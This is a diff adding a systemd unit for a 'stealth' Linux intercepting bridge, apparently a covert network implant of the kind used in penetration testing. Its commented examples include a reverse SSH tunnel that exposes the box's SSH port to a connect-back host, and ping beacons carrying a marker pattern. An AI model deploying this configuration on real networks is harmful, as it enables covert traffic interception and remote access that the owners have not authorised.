@@ -1,0 +1,24 @@
+[Unit]
+Description=Stealth Linux intercepting bridge
+After=network.target
+
+[Service]
+# Default environment (see setenv() calls in main())
+#Environment=INTERCEPTPORT=62222
+#Environment=BRIF=br0
+# Optional:
+#Environment='POSTUP=ping -nqw1 -c1 -p0004820009 4.2.2.2'
+#Environment='POSTUP=ssh -o ExitOnForwardFailure=yes -o ConnectTimeout=1 -R 1234:127.0.0.1:22 -fnNi ~/.ssh/somekey connect-back@1.2.3.4'
+#Environment='PREDOWN=ping -nqw1 -c1 -p0004820009 4.2.2.1'
+
+# Modify the interface arguments as needed.
+# Note: The right-most interface must be UP before running this program.
+ExecStart=/usr/local/sbin/intercept eth0 eth1
+Restart=on-failure
+RestartSec=5s
+# Prevent the service from entering a failed mode, for instance
+# when one of the interfaces goes missing.
+StartLimitInterval=0
+
+[Install]
+WantedBy=multi-user.target
